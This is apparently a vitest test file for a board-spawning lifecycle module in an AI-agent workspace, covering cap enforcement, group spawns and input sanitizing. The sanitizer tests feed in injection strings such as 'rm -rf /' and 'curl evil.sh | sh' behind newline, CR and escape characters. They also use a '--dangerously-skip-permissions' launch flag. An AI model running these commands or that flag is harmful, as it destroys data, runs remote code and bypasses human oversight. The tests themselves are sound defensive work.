import { describe, expect, it } from 'vitest'
import type { BoardOutput, BoardResult, MemoryDoc } from '@expanse-ade/mcp'
import { createMcpLifecycle } from './mcpLifecycle'
import type { BoardRegistry } from './mcpRegistry'

const EMPTY_OUTPUT: BoardOutput = { text: '', total: 0, returned: 0, droppedOlder: false }
const EMPTY_RESULT: BoardResult = { present: false }
const EMPTY_MEMORY: MemoryDoc = { present: false, text: '' }

/** No-op dispatch dependencies the lifecycle cluster never touches. */
const DISPATCH_DEFAULTS = {
  writeToPty: (): boolean => true,
  confirm: async (): Promise<{ approved: boolean }> => ({ approved: true }),
  audit: async (): Promise<void> => {},
  recordResult: (): void => {},
  listConnectors: () => [],
  subscribeStatus: () => () => {}
}

/**
 * A registry whose mirror is mutated by the commands the lifecycle issues (so its own
 * spawns/closes show up in listBoards, like the real renderer). Modelled on
 * mcpOrchestrator.test.ts's `liveReg`. `removeFail` makes a removeBoard ack fail for one id.
 */
function liveReg(opts: { drained?: string[]; removeFailId?: () => string | null } = {}): {
  registry: BoardRegistry
  boards: Array<{ id: string; type: string; title: string; status?: string }>
} {
  const boards: Array<{ id: string; type: string; title: string; status?: string }> = []
  const registry: BoardRegistry = {
    listBoards: () => boards,
    listSessions: () => [],
    readOutput: () => EMPTY_OUTPUT,
    readResult: () => EMPTY_RESULT,
    readMemory: () => EMPTY_MEMORY,
    readSummary: () => EMPTY_MEMORY,
    sendCommand: async (cmd) => {
      if (cmd.type === 'addBoard')
        boards.push({ id: cmd.board.id, type: cmd.board.type, title: 'T', status: 'running' })
      if (cmd.type === 'spawnGroup') {
        // Mirror the whole cluster, exactly as the renderer republishes a spawned zone.
        const { terminal, planning, browser } = cmd.members
        boards.push({ id: terminal.id, type: 'terminal', title: 'T', status: 'running' })
        // A planning member's real status bucket is 'static' (boardStatus.ts's
        // boardStatusBucket) — mirror the value the renderer actually emits.
        if (planning)
          boards.push({ id: planning.id, type: 'planning', title: 'T', status: 'static' })
        if (browser) boards.push({ id: browser.id, type: 'browser', title: 'T', status: 'idle' })
      }
      if (cmd.type === 'removeBoard') {
        if (opts.removeFailId?.() === cmd.id) return { ok: false, error: 'no-window' }
        const i = boards.findIndex((b) => b.id === cmd.id)
        if (i >= 0) boards.splice(i, 1)
      }
      return { ok: true, type: cmd.type }
    },
    drainPty: async (id) => {
      opts.drained?.push(id)
    },
    ...DISPATCH_DEFAULTS
  }
  return { registry, boards }
}

describe('createMcpLifecycle (DI factory — extracted from buildOrchestrator)', () => {
  it('🔒 BUG-003: two concurrent spawns at cap-1 never exceed the cap (reserve-before-await)', async () => {
    // The cap check is synchronous but the slot must be reserved BEFORE `await sendCommand`.
    // sendCommand yields the event loop, so two spawns fired near the cap both pass the
    // `tracked.size >= cap` check unless the reservation happens before the await → cap+1.
    const clock = 0
    const boards: Array<{ id: string; type: string; title: string; status?: string }> = []
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        await Promise.resolve() // yield: both concurrent spawns interleave past the cap check
        if (cmd.type === 'addBoard')
          boards.push({ id: cmd.board.id, type: cmd.board.type, title: 'T', status: 'running' })
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: 4,
      spawnGraceMs: 5000
    })
    // Fill to cap-1 sequentially (3 of 4 slots used).
    for (let i = 0; i < 3; i++) await life.spawnBoard({ type: 'terminal' })
    // Fire two concurrently into the single remaining slot: exactly one may win.
    const results = await Promise.allSettled([
      life.spawnBoard({ type: 'terminal' }),
      life.spawnBoard({ type: 'terminal' })
    ])
    const fulfilled = results.filter((r) => r.status === 'fulfilled').length
    const rejected = results.filter((r) => r.status === 'rejected') as PromiseRejectedResult[]
    expect(fulfilled).toBe(1)
    expect(rejected).toHaveLength(1)
    expect(rejected[0].reason).toMatchObject({ message: expect.stringMatching(/cap/i) })
    // The live budget is now exactly at the cap — a further spawn rejects (no cap+1).
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i)
  })

  it('reads a getter cap FRESH per spawn so a live config change applies (no rebuild)', async () => {
    // buildOrchestrator passes a getter (the Settings-backed config) instead of a fixed number, so
    // raising/lowering the cap takes effect on the next spawn check without rebuilding anything.
    const clock = 0
    const { registry, boards } = liveReg()
    let cap = 2
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: () => cap,
      spawnGraceMs: 5000
    })
    // Fill to the initial cap of 2 → the 3rd spawn is rejected.
    await life.spawnBoard({ type: 'terminal' })
    await life.spawnBoard({ type: 'terminal' })
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i)
    // Raise the cap LIVE → the next spawn now succeeds (the getter is re-read).
    cap = 4
    await expect(life.spawnBoard({ type: 'terminal' })).resolves.toMatchObject({
      id: expect.any(String)
    })
    // 3 boards live now; LOWER the cap below the live count → a new spawn rejects, but the existing
    // boards are untouched (the chosen "leave running, block new" semantics).
    cap = 2
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i)
    expect(boards.length).toBe(3)
  })

  it('🔒 BUG-009: closeBoard frees the cap slot even when removeBoard fails (PTY already dead)', async () => {
    const clock = 0
    const drained: string[] = []
    let removeOk = false
    let failId: string | null = null
    const { registry } = liveReg({ drained, removeFailId: () => (removeOk ? null : failId) })
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: 4,
      spawnGraceMs: 5000
    })
    const ids: string[] = []
    for (let i = 0; i < 4; i++) ids.push((await life.spawnBoard({ type: 'terminal' })).id)
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i) // at the cap
    // Close one, but the renderer rejects the removeBoard — the close throws…
    failId = ids[0]
    await expect(life.closeBoard(ids[0])).rejects.toThrow(/no-window/)
    expect(drained).toContain(ids[0]) // the PTY was drained/killed regardless
    // …yet the slot was freed (finally), so a fresh spawn succeeds (no leaked slot).
    removeOk = true
    await expect(life.spawnBoard({ type: 'terminal' })).resolves.toHaveProperty('id')
  })

  it("🔒 BUG-019: closeBoard fires onBoardClosed so the host can revoke the board's MCP token", async () => {
    const clock = 0
    const { registry } = liveReg()
    const closed: string[] = []
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: 4,
      spawnGraceMs: 5000,
      onBoardClosed: (boardId) => closed.push(boardId)
    })
    const { id } = await life.spawnBoard({ type: 'terminal' })
    await life.closeBoard(id)
    expect(closed).toEqual([id])
  })

  it('🔒 BUG-019: onBoardClosed still fires when removeBoard fails (board is dead either way)', async () => {
    const clock = 0
    let failId: string | null = null
    const { registry } = liveReg({ removeFailId: () => failId })
    const closed: string[] = []
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: 4,
      spawnGraceMs: 5000,
      onBoardClosed: (boardId) => closed.push(boardId)
    })
    const { id } = await life.spawnBoard({ type: 'terminal' })
    failId = id
    await expect(life.closeBoard(id)).rejects.toThrow(/no-window/)
    expect(closed).toEqual([id]) // the token still gets revoked despite the failed ack
  })

  it('🔒 APP-N3: rejects an off-type spawn at the adapter — no command sent (reject precedes side effects)', async () => {
    const clock = 0
    const seen: string[] = []
    const boards: Array<{ id: string; type: string; title: string; status?: string }> = []
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        seen.push(cmd.type)
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    const life = createMcpLifecycle({
      registry,
      now: () => clock,
      cap: 4,
      spawnGraceMs: 5000
    })
    await expect(life.spawnBoard({ type: 'evil' })).rejects.toThrow(/type|spawnable/i)
    expect(seen).toEqual([]) // nothing reached the renderer / mint path
  })
})

describe('createMcpLifecycle.spawnGroup (PR-5b — feature-zone cluster)', () => {
  type MirrorBoard = { id: string; type: string; title: string; status?: string }

  /**
   * Capture the commands the lifecycle sends, so a test can assert the spawnGroup envelope.
   * `failGroupSend` fails ONLY the spawnGroup ack (addBoard still succeeds), so a release test can
   * spawn afterwards to prove the reserved cluster slots were freed.
   */
  function recordingReg(opts: { failGroupSend?: boolean } = {}): {
    registry: BoardRegistry
    sent: Array<{ type: string; [k: string]: unknown }>
    boards: MirrorBoard[]
  } {
    const sent: Array<{ type: string; [k: string]: unknown }> = []
    const boards: MirrorBoard[] = []
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        sent.push(cmd as never)
        if (cmd.type === 'spawnGroup') {
          if (opts.failGroupSend) return { ok: false, error: 'no-window' }
          const { terminal, planning, browser } = cmd.members
          boards.push({ id: terminal.id, type: 'terminal', title: 'T', status: 'running' })
          if (planning) boards.push({ id: planning.id, type: 'planning', title: 'T' })
          if (browser) boards.push({ id: browser.id, type: 'browser', title: 'T' })
        }
        if (cmd.type === 'addBoard')
          boards.push({ id: cmd.board.id, type: cmd.board.type, title: 'T', status: 'running' })
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    return { registry, sent, boards }
  }

  const makeLife = (registry: BoardRegistry, cap = 4): ReturnType<typeof createMcpLifecycle> =>
    createMcpLifecycle({
      registry,
      now: () => 0,
      cap,
      spawnGraceMs: 5000
    })

  it('spawns a terminal-only zone by default (planning/browser absent → omitted from the envelope + result)', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry)
    const res = await life.spawnGroup({ name: 'Auth zone' })
    expect(res.terminalId).toBeTruthy()
    expect(res.groupId).toBeTruthy()
    expect(res.planningId).toBeUndefined()
    expect(res.browserId).toBeUndefined()
    expect(sent).toHaveLength(1)
    expect(sent[0]).toMatchObject({
      type: 'spawnGroup',
      group: { id: res.groupId, name: 'Auth zone' },
      members: { terminal: { id: res.terminalId } }
    })
    // No optional members in the envelope.
    expect((sent[0].members as Record<string, unknown>).planning).toBeUndefined()
    expect((sent[0].members as Record<string, unknown>).browser).toBeUndefined()
    expect(boards).toHaveLength(1) // only the terminal landed in the mirror
  })

  it('spawns a full {terminal, planning, browser} cluster — all ids minted + returned + in the envelope', async () => {
    const { registry, sent, boards } = recordingReg()
    const life = makeLife(registry)
    const res = await life.spawnGroup({ name: 'Checkout', planning: true, browser: true })
    expect(res.planningId).toBeTruthy()
    expect(res.browserId).toBeTruthy()
    // Every id is distinct (group + 3 boards).
    const ids = [res.groupId, res.terminalId, res.planningId, res.browserId]
    expect(new Set(ids).size).toBe(4)
    expect(sent[0]).toMatchObject({
      members: {
        terminal: { id: res.terminalId },
        planning: { id: res.planningId },
        browser: { id: res.browserId }
      }
    })
    expect(boards).toHaveLength(3)
  })

  it('🔒 cap: rejects a cluster whose member count would exceed the budget — BEFORE any send (no half-built zone)', async () => {
    const { registry, sent } = recordingReg()
    const life = makeLife(registry, 4)
    // Pre-fill 2 of 4 slots.
    await life.spawnBoard({ type: 'terminal' })
    await life.spawnBoard({ type: 'terminal' })
    sent.length = 0
    // A 3-member group (2 + 3 = 5 > cap 4) must reject with no spawnGroup command sent.
    await expect(
      life.spawnGroup({ name: 'Too big', planning: true, browser: true })
    ).rejects.toThrow(/cap/i)
    expect(sent.find((c) => c.type === 'spawnGroup')).toBeUndefined()
    // A 2-member group (2 + 2 = 4, exactly at cap) fits.
    await expect(life.spawnGroup({ name: 'Fits', planning: true })).resolves.toMatchObject({
      planningId: expect.any(String)
    })
  })

  it('🔒 cap: a 3-board group consumes 3 slots — only 1 remains, so a further 2-member group rejects but a single spawn fits', async () => {
    const { registry } = recordingReg()
    const life = makeLife(registry, 4)
    await life.spawnGroup({ name: 'Zone', planning: true, browser: true }) // 3 slots used
    await expect(life.spawnGroup({ name: 'Nope', planning: true })).rejects.toThrow(/cap/i)
    await expect(life.spawnBoard({ type: 'terminal' })).resolves.toHaveProperty('id') // the last slot
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i) // now full
  })

  it('🔒 release-all-on-fail: a rejected ack frees EVERY reserved slot (no leaked budget)', async () => {
    const { registry, boards } = recordingReg({ failGroupSend: true })
    const life = makeLife(registry, 4)
    // A 3-member group fails its ack → all 3 reserved slots must be released.
    await expect(
      life.spawnGroup({ name: 'Doomed', planning: true, browser: true })
    ).rejects.toThrow(/spawn_group failed/i)
    expect(boards).toHaveLength(0) // the failed group landed NOTHING in the mirror
    // The whole budget is free again (no leaked reservation): the FULL cap of 4 single spawns
    // succeeds (addBoard acks ok here), the 5th rejects — exactly as on a fresh lifecycle.
    for (let i = 0; i < 4; i++) await life.spawnBoard({ type: 'terminal' })
    await expect(life.spawnBoard({ type: 'terminal' })).rejects.toThrow(/cap/i)
  })

  it('rejects an empty / whitespace-only name; collapses whitespace + clamps a long one', async () => {
    const { registry, sent } = recordingReg()
    const life = makeLife(registry)
    await expect(life.spawnGroup({ name: '   ' })).rejects.toThrow(/name/i)
    expect(sent).toHaveLength(0) // bad name → no side effects
    // Whitespace (incl. newlines/tabs) collapses to single spaces; trimmed.
    await life.spawnGroup({ name: '  Auth\n\tflow  ' })
    expect((sent[0].group as { name: string }).name).toBe('Auth flow')
    // A >80-char name is clamped.
    sent.length = 0
    await life.spawnGroup({ name: 'x'.repeat(200) })
    expect((sent[0].group as { name: string }).name).toHaveLength(80)
  })

  describe('🔒 F5: launchCommand sanitizer (DEL + C1 escape-injection fix)', () => {
    // Re-use the recordingReg / makeLife helpers from the enclosing describe block.
    const launchOf = (cmd: Record<string, unknown>): string | undefined =>
      (cmd.members as { terminal: { launchCommand?: string } }).terminal.launchCommand

    it('strips DEL (0x7F) from a launchCommand — was passed by the old c >= " " filter', async () => {
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      await life.spawnGroup({
        name: 'zone',
        launchCommand: 'claude\x7f --dangerously-skip-permissions'
      })
      expect(launchOf(sent[0])).toBe('claude --dangerously-skip-permissions')
    })

    it('strips C1 CSI (U+009B) — 8-bit terminal escape-sequence opener', async () => {
      const csi = String.fromCodePoint(0x9b)
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      await life.spawnGroup({ name: 'zone', launchCommand: `claude${csi}[2J` })
      expect(launchOf(sent[0])).toBe('claude[2J')
    })

    it('strips C1 NEL (U+0085) — newline-equivalent in 8-bit terminals', async () => {
      const nel = String.fromCodePoint(0x85)
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      await life.spawnGroup({ name: 'zone', launchCommand: `claude${nel}rm -rf /` })
      // NEL stripped, not treated as a line break that injects a second command.
      expect(launchOf(sent[0])).toBe('clauderm -rf /')
    })

    it('strips the full C1 range U+0080–U+009F (all 32 code points)', async () => {
      let payload = 'cmd'
      for (let cp = 0x80; cp <= 0x9f; cp++) payload += String.fromCodePoint(cp)
      payload += 'suffix'
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      await life.spawnGroup({ name: 'zone', launchCommand: payload })
      expect(launchOf(sent[0])).toBe('cmdsuffix')
    })

    it('strips bare ESC (U+001B) — C0 terminal-escape opener', async () => {
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      await life.spawnGroup({ name: 'zone', launchCommand: 'claude\x1b[1;31mmalicious' })
      expect(launchOf(sent[0])).toBe('claude[1;31mmalicious')
    })

    it('rejects a launchCommand with an embedded LF (DispatchPayloadError — multi-line injection)', async () => {
      const { registry } = recordingReg()
      const life = makeLife(registry)
      await expect(
        life.spawnGroup({ name: 'zone', launchCommand: 'claude\nrm -rf /' })
      ).rejects.toThrow(/newline|CR|LF/i)
    })

    it('rejects a launchCommand with an embedded CR (PTY line-submit injection)', async () => {
      const { registry } = recordingReg()
      const life = makeLife(registry)
      await expect(
        life.spawnGroup({ name: 'zone', launchCommand: 'claude\rcurl evil.sh | sh' })
      ).rejects.toThrow(/newline|CR|LF/i)
    })

    it('leaves printable non-ASCII above U+009F intact (legitimate chars must survive)', async () => {
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      // U+00A0 = NBSP (first code point above the C1 range), plus accented chars.
      const input = 'café  --flag'
      await life.spawnGroup({ name: 'zone', launchCommand: input })
      expect(launchOf(sent[0])).toBe(input)
    })

    it('leaves launchCommand undefined when the sanitized result is empty', async () => {
      const { registry, sent } = recordingReg()
      const life = makeLife(registry)
      // A string of only C1 characters sanitizes to '' → should be omitted from the envelope.
      const allC1 = Array.from({ length: 32 }, (_, i) => String.fromCodePoint(0x80 + i)).join('')
      await life.spawnGroup({ name: 'zone', launchCommand: allC1 })
      expect(launchOf(sent[0])).toBeUndefined()
    })
  })
})

describe('createMcpLifecycle.spawnBoard — title (2b)', () => {
  type AddBoardSpec = { id: string; type: string; title?: string }

  /** A registry that records every addBoard command's `board` spec, so a test can assert the
   *  exact (sanitized/clamped) title the lifecycle forwarded to the renderer. */
  function recordingReg(): { registry: BoardRegistry; sent: AddBoardSpec[] } {
    const sent: AddBoardSpec[] = []
    const boards: Array<{ id: string; type: string; title: string; status?: string }> = []
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        if (cmd.type === 'addBoard') {
          sent.push({ ...cmd.board })
          boards.push({
            id: cmd.board.id,
            type: cmd.board.type,
            title: cmd.board.title ?? 'default',
            status: 'running'
          })
        }
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    return { registry, sent }
  }
  const makeLife = (registry: BoardRegistry): ReturnType<typeof createMcpLifecycle> =>
    createMcpLifecycle({
      registry,
      now: () => 0,
      cap: 8,
      spawnGraceMs: 5000
    })

  it('forwards a clean title onto the addBoard command', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'planning', title: 'Auth refactor plan' })
    expect(sent[0].title).toBe('Auth refactor plan')
  })

  it('collapses whitespace runs + trims the title', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal', title: '  Plan\t\n A  ' })
    expect(sent[0].title).toBe('Plan A')
  })

  it('strips C0 / DEL / C1 control chars (a title lands verbatim in confirm-modal bodies)', async () => {
    const { registry, sent } = recordingReg()
    // 'No<BEL>Bell<CSI>CSI<DEL>' built from codepoints (avoid invisible control bytes in source).
    const dirty = String.fromCodePoint(
      0x4e,
      0x6f,
      0x07,
      0x42,
      0x65,
      0x6c,
      0x6c,
      0x9b,
      0x43,
      0x53,
      0x49,
      0x7f
    )
    await makeLife(registry).spawnBoard({ type: 'terminal', title: dirty })
    expect(sent[0].title).toBe('NoBellCSI')
  })

  it('clamps an over-long title to the cap (80)', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal', title: 'x'.repeat(200) })
    expect(sent[0].title).toBe('x'.repeat(80))
  })

  it('clamps by code point so an emoji at the boundary is not split into a lone surrogate', async () => {
    const { registry, sent } = recordingReg()
    // 80 code points but 81 UTF-16 code units: a code-UNIT slice(0,80) would keep the emoji's high
    // surrogate and drop its low surrogate → a lone surrogate. The code-POINT clamp keeps it whole.
    const title = 'a'.repeat(79) + '😀'
    await makeLife(registry).spawnBoard({ type: 'terminal', title })
    expect(sent[0].title).toBe(title)
    expect([...(sent[0].title as string)]).toHaveLength(80) // emoji intact, not a lone surrogate
  })

  it('omits the title key when it is empty/whitespace-only (renderer uses the default)', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal', title: '   \n\t  ' })
    expect('title' in sent[0]).toBe(false)
  })

  it('omits the title key when none is supplied (back-compat)', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal' })
    expect('title' in sent[0]).toBe(false)
  })
})

describe('createMcpLifecycle.spawnBoard — prompt/cwd (spawn-time launchCommand)', () => {
  type AddBoardSpec = {
    id: string
    type: string
    title?: string
    launchCommand?: string
    cwd?: string
  }

  /** Records every addBoard `board` spec so a test can assert the exact envelope forwarded. */
  function recordingReg(): { registry: BoardRegistry; sent: AddBoardSpec[] } {
    const sent: AddBoardSpec[] = []
    const boards: Array<{ id: string; type: string; title: string; status?: string }> = []
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        if (cmd.type === 'addBoard') {
          sent.push({ ...cmd.board })
          boards.push({
            id: cmd.board.id,
            type: cmd.board.type,
            title: cmd.board.title ?? 'default',
            status: 'running'
          })
        }
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    return { registry, sent }
  }
  const makeLife = (registry: BoardRegistry, cap = 8): ReturnType<typeof createMcpLifecycle> =>
    createMcpLifecycle({
      registry,
      now: () => 0,
      cap,
      spawnGraceMs: 5000
    })

  it('forwards a sanitized prompt as the terminal launchCommand + the trimmed cwd', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({
      type: 'terminal',
      prompt: '  claude --dangerously-skip-permissions  ',
      cwd: '  C:/repos/app  '
    })
    expect(sent[0].launchCommand).toBe('claude --dangerously-skip-permissions')
    expect(sent[0].cwd).toBe('C:/repos/app')
  })

  it('strips control chars from the prompt (same sanitizer as spawnGroup — one rule)', async () => {
    const { registry, sent } = recordingReg()
    // 'echo <ESC>hi<DEL><CSI>' — C0/DEL/C1 must be stripped on the spawn-time PTY write path.
    const dirty = 'echo ' + String.fromCodePoint(0x1b) + 'hi' + String.fromCodePoint(0x7f, 0x9b)
    await makeLife(registry).spawnBoard({ type: 'terminal', prompt: dirty })
    expect(sent[0].launchCommand).toBe('echo hi')
  })

  it('clamps an over-long prompt to 400', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal', prompt: 'x'.repeat(1000) })
    expect(sent[0].launchCommand).toBe('x'.repeat(400))
  })

  it('rejects a multiline prompt (embedded LF) — no command sent, no cap slot burned', async () => {
    const { registry, sent } = recordingReg()
    const life = makeLife(registry, 1)
    await expect(life.spawnBoard({ type: 'terminal', prompt: 'echo a\necho b' })).rejects.toThrow()
    expect(sent).toHaveLength(0)
    // The single cap slot must still be free: a clean spawn fits.
    await expect(life.spawnBoard({ type: 'terminal' })).resolves.toHaveProperty('id')
  })

  it('rejects a prompt on a non-terminal board BEFORE any side effect', async () => {
    const { registry, sent } = recordingReg()
    await expect(
      makeLife(registry).spawnBoard({ type: 'planning', prompt: 'echo hi' })
    ).rejects.toThrow(/terminal/i)
    expect(sent).toHaveLength(0)
  })

  it('rejects a cwd on a non-terminal board BEFORE any side effect', async () => {
    const { registry, sent } = recordingReg()
    await expect(makeLife(registry).spawnBoard({ type: 'browser', cwd: 'C:/x' })).rejects.toThrow(
      /terminal/i
    )
    expect(sent).toHaveLength(0)
  })

  it('omits launchCommand when the prompt sanitizes to empty (bare shell, not an empty write)', async () => {
    const { registry, sent } = recordingReg()
    // Control-chars-only prompt → sanitizes to '' → the key must be absent, not ''.
    await makeLife(registry).spawnBoard({
      type: 'terminal',
      prompt: String.fromCodePoint(0x07, 0x7f)
    })
    expect('launchCommand' in sent[0]).toBe(false)
  })

  it('treats a whitespace-only prompt/cwd as absent (no reject on a non-terminal type)', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'planning', prompt: '   ', cwd: ' ' })
    expect('launchCommand' in sent[0]).toBe(false)
    expect('cwd' in sent[0]).toBe(false)
  })

  it('omits both keys when neither is supplied (back-compat envelope)', async () => {
    const { registry, sent } = recordingReg()
    await makeLife(registry).spawnBoard({ type: 'terminal' })
    expect('launchCommand' in sent[0]).toBe(false)
    expect('cwd' in sent[0]).toBe(false)
  })
})

describe('createMcpLifecycle.spawnBoard — sourceBoardId auto-cable (rc.6)', () => {
  type SentCmd = {
    board: { id: string; type: string }
    connector?: { sourceId: string }
  }

  /** Records every addBoard envelope; the mirror is pre-seeded with `boards`. */
  function cableReg(seed: Array<{ id: string; type: string; title: string }>): {
    registry: BoardRegistry
    sent: SentCmd[]
  } {
    const sent: SentCmd[] = []
    const boards = [...seed]
    const registry: BoardRegistry = {
      listBoards: () => boards,
      listSessions: () => [],
      readOutput: () => EMPTY_OUTPUT,
      readResult: () => EMPTY_RESULT,
      readMemory: () => EMPTY_MEMORY,
      readSummary: () => EMPTY_MEMORY,
      sendCommand: async (cmd) => {
        if (cmd.type === 'addBoard') {
          sent.push({ board: { id: cmd.board.id, type: cmd.board.type }, connector: cmd.connector })
          boards.push({ id: cmd.board.id, type: cmd.board.type, title: 'T' })
        }
        return { ok: true, type: cmd.type }
      },
      drainPty: async () => {},
      ...DISPATCH_DEFAULTS
    }
    return { registry, sent }
  }
  const makeLife = (registry: BoardRegistry): ReturnType<typeof createMcpLifecycle> =>
    createMcpLifecycle({ registry, now: () => 0, cap: 8, spawnGraceMs: 5000 })

  it('a terminal spawn from a live TERMINAL source rides a connector request on the envelope', async () => {
    const { registry, sent } = cableReg([{ id: 'src-term', type: 'terminal', title: 'A' }])
    await makeLife(registry).spawnBoard({ type: 'terminal', sourceBoardId: 'src-term' })
    expect(sent[0].connector).toEqual({ sourceId: 'src-term' })
  })

  it('a NON-terminal spawn never requests a cable (cables are terminal→terminal only)', async () => {
    const { registry, sent } = cableReg([{ id: 'src-term', type: 'terminal', title: 'A' }])
    await makeLife(registry).spawnBoard({ type: 'planning', sourceBoardId: 'src-term' })
    expect(sent[0].connector).toBeUndefined()
    expect(sent[0].board.type).toBe('planning') // the spawn itself still succeeds
  })

  it('a NON-terminal source never authorizes a cable (never Browser → PTY routes)', async () => {
    const { registry, sent } = cableReg([{ id: 'src-web', type: 'browser', title: 'W' }])
    await makeLife(registry).spawnBoard({ type: 'terminal', sourceBoardId: 'src-web' })
    expect(sent[0].connector).toBeUndefined()
  })

  it('an unknown/closed source skips the cable but the spawn still succeeds (board > cable)', async () => {
    const { registry, sent } = cableReg([])
    const { id } = await makeLife(registry).spawnBoard({
      type: 'terminal',
      sourceBoardId: 'ghost'
    })
    expect(id).toBeTruthy()
    expect(sent[0].connector).toBeUndefined()
  })

  it('no sourceBoardId → no connector key at all (back-compat envelope)', async () => {
    const { registry, sent } = cableReg([])
    await makeLife(registry).spawnBoard({ type: 'terminal' })
    expect('connector' in sent[0] && sent[0].connector !== undefined).toBe(false)
  })
})
